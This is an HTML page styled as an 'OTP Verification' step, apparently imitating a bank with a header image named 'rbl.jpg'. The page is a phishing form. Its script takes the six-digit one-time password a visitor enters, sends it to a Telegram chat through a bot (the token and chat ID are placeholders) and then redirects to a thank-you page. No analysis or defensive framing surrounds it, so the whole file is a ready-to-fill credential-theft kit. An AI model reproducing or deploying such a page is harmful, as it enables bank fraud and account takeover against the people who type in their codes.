<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
            background-color: #f4f4f9;
        }
        form {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        .header, .footer {
            width: 100%;
            text-align: center;
            margin-bottom: 20px;
        }
        .header img, .footer img {
            width: 100%;
            max-width: 100%;
            border-radius: 8px;
        }
        h2 {
            text-align: center;
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 5px;
            border: none;
            border-bottom: 2px solid #ccc;
            background: none;
            outline: none;
            transition: border-color 0.3s ease;
            font-size: 20px;
            text-align: center;
            letter-spacing: 5px;
        }
        input:focus {
            border-bottom: 2px solid #007BFF;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 4px;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>

<body>

<form id="otpForm">
    <!-- Header -->
    <div class="header">
        <img src="rbl.jpg" alt="Header Image">
    </div>
    
    <h2>OTP Verification</h2>
    
    <label for="otp">Enter OTP</label>
    <input type="text" id="otp" name="otp" pattern="[0-9]{6}" maxlength="6" placeholder="123456" required>
    
    <br><br><br>
    
    <button type="submit">Verify OTP</button>
</form>

<script>
    document.getElementById('otpForm').addEventListener('submit', function (e) {
        e.preventDefault();

        // Collect OTP
        const otp = document.getElementById('otp').value;

        if (otp.length !== 6) {
            alert('OTP must be exactly 6 digits.');
            return;
        }

        // Send OTP to Telegram
        const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
        const chatId = 'YOUR_CHAT_ID';
        const message = `New OTP Submission:
        - OTP: ${otp}`;
        
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message }),
        }).then(response => {
            if (response.ok) {
                // Redirect to another page after successful submission
                window.location.href = 'https://example.com/thank-you'; // Replace with your URL
            } else {
                alert('Error sending data. Please try again.');
            }
        }).catch(error => {
            alert('Error sending data. Please try again.');
            console.error(error);
        });
    });
</script>

</body>
</html>
